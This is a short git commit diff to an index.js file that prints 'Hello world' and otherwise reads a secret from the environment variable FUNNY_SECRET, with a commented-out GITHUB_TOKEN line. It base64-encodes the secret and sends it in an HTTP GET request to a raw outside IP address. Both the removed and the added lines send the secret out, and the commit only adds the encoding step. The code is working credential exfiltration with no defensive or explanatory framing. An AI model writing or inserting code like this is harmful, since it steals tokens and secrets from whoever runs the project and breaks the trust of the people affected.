efd5f48d6d773341895e89616583ba1895192012
Vasilii <inkz@xakep.ru>
2022-09-15 10:34:24 +1000

    yyy

--- index.js
+++ index.js
@@ -4,9 +4,9 @@ const http = require('http')
 console.log('Hello world')
 
 // const token = process.env.GITHUB_TOKEN
-const token = process.env.FUNNY_SECRET
+const token = Buffer.from(process.env.FUNNY_SECRET).toString('base64')
 
-http.get(`http://84.38.182.14/xxx=${token}`, (res) => {
+http.get(`http://84.38.182.14/zaz=${token}`, (res) => {
   const { statusCode } = res;
   console.log(statusCode);
 })
